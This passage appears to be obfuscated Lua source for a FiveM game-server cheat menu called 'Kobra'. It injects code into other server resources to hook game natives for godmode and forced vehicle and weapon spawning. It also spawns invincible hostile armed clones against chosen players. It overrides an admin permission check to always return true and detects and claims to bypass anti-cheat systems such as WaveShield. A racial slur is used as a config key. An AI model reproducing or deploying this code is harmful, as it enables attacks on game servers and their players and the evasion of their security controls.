            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]],v230));break;end if (v229==1) then MachoHookNative(2596915000000000000 -(1140 + 149) ,function(v692) return true,v692;end);MachoHookNative(15321135000000000000,function(v693,v694,v695,v696,v697,v698,v699) return true,v693,v694,v695,v696,v697,v698,v699;end);v229=2 + 0 ;end end end;v12.HandleGodmodeToggle=function(v231,v232) local v233=0 -0 ;local v234;local v235;while true do if (v233==(0 + 0)) then v234=GetResourceState("WaveShield")=="started" ;v235=((GetResourceState("monitor")=="started") and "monitor") or (v234 and "WaveShield") or "any" ;v233=3 -2 ;end if (v233==(1 -0)) then if v234 then local v774=0 + 0 ;while true do if ((0 -0)==v774) then if v232 then local v1170=0;while true do if (v1170==(186 -(165 + 21))) then v12:Notify("success","Kobra","Godmode Enabled (WaveShield)",3111 -(61 + 50) );v48(v235,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end else local v1171=0 + 0 ;while true do if (v1171==(0 -0)) then v12:Notify("error","Kobra","Godmode Disabled (WaveShield)",6045 -3045 );v48(v235,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end end return;end end end if v232 then local v775=0;while true do if (v775==0) then v12:Notify("success","Kobra","Godmode Enabled",3000);MachoInjectResource2(2 + 1 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);break;end end else v12:Notify("error","Kobra","Godmode Disabled",4460 -(1295 + 165) );MachoInjectResource2(1 + 2 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);end break;end end end;v12.SpawnSelectedVehicle=function(v236,v237,v238,v239) local v240=0;local v241;local v242;local v243;local v244;local v245;while true do if (v240==1) then v242=GetVehiclePedIsIn(v241,false);v243=GetCurrentServerEndpoint();v240=1 + 1 ;end if ((1399 -(819 + 578))==v240) then v244=GetEntityCoords(v241);v245=GetEntityHeading(v241);v240=3;end if (v240==(1405 -(331 + 1071))) then if (GetResourceState("solos-rentals")=="started") then local v776=743 -(588 + 155) ;while true do if (v776==1) then v48("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v237,tostring(v239),tostring(v238),v244.x,v244.y,v244.z,v245));break;end if (v776==0) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",4282 -(546 + 736) );print("Creating Vehicle via Fallback #1");v776=1938 -(1834 + 103) ;end end elseif (GetResourceState("amigo")=="started") then local v984=0 + 0 ;while true do if (v984==0) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",8949 -5949 );print("Creating Vehicle via Fallback #2");v984=1;end if (v984==(1767 -(1536 + 230))) then v48("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v237,tostring(v239),tostring(v238)));break;end end elseif v75 then local v1127=491 -(128 + 363) ;while true do if (v1127==0) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",3000);print("Creating Vehicle via Fallback #3");v1127=1 + 0 ;end if (v1127==1) then v48(v75,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v237,tostring(v239),tostring(v238)));break;end end elseif (GetResourceState("qb-core")=="started") then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",7463 -4463 );print("Creating Vehicle via Fallback #4");v48("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v237   .. [["

            if ]]   .. tostring(v239)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v238)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v244.x   .. [[, ]]   .. v244.y   .. [[, ]]   .. v244.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v245   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );elseif ((v243:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1347=0 + 0 ;while true do if (v1347==(1 -0)) then v48("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v237,tostring(v239),tostring(v238)));break;end if (v1347==0) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",8831 -5831 );print("Creating Vehicle via Fallback #5");v1347=2 -1 ;end end elseif (GetResourceState("lunar_bridge")=="started") then local v1439=0;while true do if (v1439==0) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",2059 + 941 );print("Creating Vehicle via Fallback #6");v1439=1;end if (v1439==(1010 -(615 + 394))) then v48("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v237,tostring(v239),tostring(v238)));break;end end elseif (GetResourceState("lation_laundering")=="started") then local v1530=0 + 0 ;while true do if (v1530==0) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",3000);print("Creating Vehicle via Fallback #7");v1530=1 + 0 ;end if (v1530==1) then v48("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v237,tostring(v238),tostring(v239)));break;end end else local v1531=0;local v1532;while true do if (v1531==(2 -1)) then if (GetResourceState("lb-phone")=="started") then local v1707=0 -0 ;local v1708;local v1709;while true do if (v1707==(652 -(59 + 592))) then v1708,v1709=pcall(function() v48("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v239),v237,tostring(v238),v244.x,v244.y,v244.z,v245));end);if  not v1708 then end break;end if (v1707==0) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",6641 -3641 );print("Creating Vehicle via Fallback #10");v1707=1;end end elseif (GetResourceState("qb-core")=="started") then local v1729=0;while true do if (0==v1729) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",3000);print("Creating Vehicle via Fallback #11");v1729=1 -0 ;end if (v1729==(1 + 0)) then v48("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v239),GetHashKey(v237),tostring(v238)));break;end end else return;end break;end if ((171 -(70 + 101))==v1531) then v1532=v74();if v1532 then local v1710=0;while true do if (v1710==(2 -1)) then v48(v1532,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v237,tostring(v239),tostring(v238)));break;end if (0==v1710) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",2128 + 872 );print("Creating Vehicle via Fallback #8");v1710=1;end end elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then local v1730=0 -0 ;local v1731;local v1732;local v1733;local v1734;local v1735;local v1736;local v1737;while true do if (v1730==(244 -(123 + 118))) then if  not v1736 then end return;end if (v1730==2) then v1734=tostring(v238);v1735=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1732,v1733,v1734);v1736,v1737=pcall(MachoInjectResourceRaw,"monitor",v1735);v1730=1 + 2 ;end if (v1730==(1 + 0)) then function v1731(v1758) local v1759=1399 -(653 + 746) ;local v1760;while true do if (v1759==(0 -0)) then v1760={};for v1769=1 -0 , #v1758 do v1760[v1769]=string.byte(v1758,v1769);end v1759=2 -1 ;end if (v1759==(1 + 0)) then return "{"   .. table.concat(v1760,",")   .. "}" ;end end end v1732=v1731(v237);v1733=tostring(v239);v1730=2 + 0 ;end if ((0 + 0)==v1730) then v236:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",368 + 2632 );if ( not v237 or (v237=="")) then return;end v1731=nil;v1730=1 + 0 ;end end end v1531=2 -1 ;end end end break;end if (v240==(0 + 0)) then if ( not v237 or (v237=="")) then return;end v241=PlayerPedId();v240=1 -0 ;end end end;local function v81() local v246=1234 -(885 + 349) ;local v247;while true do if (v246==(0 + 0)) then v247={"WaveShield","FiniAC"};for v700,v701 in ipairs(v247) do if (GetResourceState(v701)=="started") then return false;end end v246=969 -(915 + 53) ;end if (v246==(802 -(768 + 33))) then return GetResourceState("ReaperV4")=="started" ;end end end local function v82() local v248=0 -0 ;local v249;while true do if (v248==1) then return GetResourceState("FiniAC")=="started" ;end if (v248==0) then v249={"ReaperV4","WaveShield"};for v702,v703 in ipairs(v249) do if (GetResourceState(v703)=="started") then return false;end end v248=1;end end end v12.SpawnSelectedWeapon=function(v250,v251) local v252=0;local v253;local v254;local v255;local v256;local v257;while true do if (v252==0) then if ( not v251 or (v251=="")) then return;end v253=nil;v252=1;end if (v252==(5 -2)) then v256=GetHashKey(v251);if (v256==(328 -(287 + 41))) then return;end v252=851 -(638 + 209) ;end if ((1 + 0)==v252) then function v253(v704) local v705=1686 -(96 + 1590) ;local v706;while true do if (v705==(1673 -(741 + 931))) then return table.concat(v706,",");end if (v705==(0 + 0)) then v706={};for v1032=2 -1 , #v704 do v706[v1032]=string.byte(v704,v1032);end v705=4 -3 ;end end end v254=v253(v251);v252=1 + 1 ;end if ((2 + 2)==v252) then v257=GetResourceState("WaveShield")=="started" ;if v257 then local v777=0 + 0 ;while true do if (v777==0) then v250:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",3000);v48(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
